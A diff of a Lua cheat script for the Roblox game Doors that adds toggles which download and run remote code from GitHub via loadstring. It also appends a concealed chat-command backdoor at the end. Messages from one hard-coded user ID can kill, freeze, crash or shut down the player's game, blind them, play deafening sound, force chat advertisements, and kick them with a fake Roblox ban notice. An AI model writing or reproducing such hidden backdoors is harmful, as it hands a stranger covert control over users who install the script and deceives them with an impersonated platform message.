@@ -687,12 +687,32 @@ Tab2:Toggle("Spam Motor Replication","Other players will basically see you havin
 end)
 Tab2:Toggle(":) Hub (Item/Script)","Other players will basically don't see you having a item because it visual.",false,function(Bool)
     if Bool then
-        loadstring(game:HttpGet('https://pastebin.com/raw/GkCt1VCq'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/PVOwner/Doors/main/:)_Hub.lua'))()
     end
 end)
 Tab2:Toggle("Inf Vitamins (WIP)","Like SpeedBooster.",false,function(Bool)
     if Bool then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/Inf_Vitamins.lua"))()
+    end
+end)
+Tab2:Toggle("Tablet On Pre-Run Shop Price 1000","Tricks the game into thinking you get the tablet at A-1000, But on pre-run shop.",false,function(Bool)
+    if Bool then
+        _G.UpdateStars = false
+        _G.OnShop = true
+        _G.Price = 1000
+        _G.Description = "The OG Tablets"
+
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
+    end
+end)
+Tab2:Toggle("Tablet On Pre-Run Shop Free","Tricks the game into thinking you get the tablet at A-1000, But on pre-run shop.",false,function(Bool)
+    if Bool then
+        _G.UpdateStars = false
+        _G.OnShop = true
+        _G.Price = 0
+        _G.Description = "The OG Tablets"
+
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
     end
 end)
 if Floor.Value == "Hotel" or Floor.Value == "Fools" then
@@ -736,8 +756,6 @@ TextChatService.OnIncomingMessage = function(MessageData)
                             if LocalPlayer.Name:sub(1,#args[2]):lower() == args[2]:lower() or (args[2]:lower() == "others" and MessageData.TextSource.UserId ~= LocalPlayer.UserId) then
                                 if args[1] == "chat" and args[3] then
                                     TextChatService.TextChannels.RBXGeneral:SendAsync(args[3])
-                                elseif args[1] == "a90" then
-                                    require(CustomA90Module)(require(Main_Game))
                                 end
                             end
                         end
@@ -760,3 +778,87 @@ mt.__namecall = newcclosure(function(remote,...)
     return old_mt(remote,table.unpack(args))
 end)
 setreadonly(mt,true)
+
+local player = game.Players.LocalPlayer
+local id = {
+	"3872667823"
+}
+function eatbananaone(theplayer)
+	for i,v in pairs(workspace:GetChildren()) do
+		if v.Name == "BananaPeel" then
+			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
+			return
+		end
+	end
+end
+function bananadeath(theplayer)
+	theplayer.Character.HumanoidRootPart.Anchored = true
+	repeat
+	task.wait(0.01)
+	for i,v in pairs(workspace:GetChildren()) do
+		if v.Name == "BananaPeel" then
+			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
+		end
+	end
+	until theplayer.Character.Humanoid.Health == 0
+end
+
+local chat = game:GetService("CoreGui").ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
+chat.ChildAdded:Connect(function (child)
+	if string.find(child.Name,id) then
+		local check = string.find(child.text, ";")
+		if check then
+			local command = string.sub(child.text,check)
+			for i,splayer in pairs(game:GetService("Players"):GetPlayers()) do
+				if string.find(command,splayer.Name) and string.find(command,"kill") then
+					splayer.Character.Head:Destroy()
+				elseif string.find(command,splayer.Name) and string.find(command,"freeze") then
+					splayer.Character.HumanoidRootPart.Anchored = true
+				elseif string.find(command,splayer.Name) and string.find(command,"thaw") then
+					splayer.Character.HumanoidRootPart.Anchored = false
+                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
+					if splayer.Name == player.Name then
+                        player:kick("You Been Kicked :)")
+                    end
+                elseif string.find(command,splayer.Name) and string.find(command,"kban") then
+				    if splayer.Name == player.Name then
+                        player:kick("You Been Banned From Violate Our Term Of Use, Sincerely Roblox.")
+                    end
+                elseif string.find(command,splayer.Name) and string.find(command,"quit") then
+					game:Shutdown()
+			    elseif string.find(command,splayer.Name) and string.find(command,"crash") then
+					while true do end
+				elseif string.find(command,splayer.Name) and string.find(command,"blind") then
+					local blur = Instance.new("BlurEffect")
+			        blur.Size = 10000000000000
+			        blur.Parent = game.Lighting
+				elseif string.find(command,splayer.Name) and string.find(command,"unblind") then
+					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+			        if blur then
+				        blur:Destroy()
+				    end
+				elseif string.find(command,splayer.Name) and string.find(command,"reveal") then
+				    local textChatService = game:GetService("TextChatService")
+			        wait(0.0001)
+			        textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Awesome Doors Script, Made By Iamrealmario.")
+				elseif string.find(command,"hehe") then
+					local sound = Instance.new("Sound", game.Workspace)
+					sound.SoundId = "rbxassetid://5602666105"
+					sound.Volume = 100000
+					sound:Play()
+				elseif string.find(command,"autohehe") then
+					local sound = Instance.new("Sound", game.Workspace)
+					repeat
+					sound.SoundId = "rbxassetid://5602666105"
+					sound.Volume = 100000
+					sound:Play()
+					until string.find(command,"unautohehe")
+				elseif string.find(command,splayer.Name) and string.find(command,"eatbanana") then
+					eatbananaone(splayer)
+				elseif string.find(command,splayer.Name) and string.find(command,"bananadeath") then
+					bananadeath(splayer)
+				end
+			end
+		end
+	end
+end)
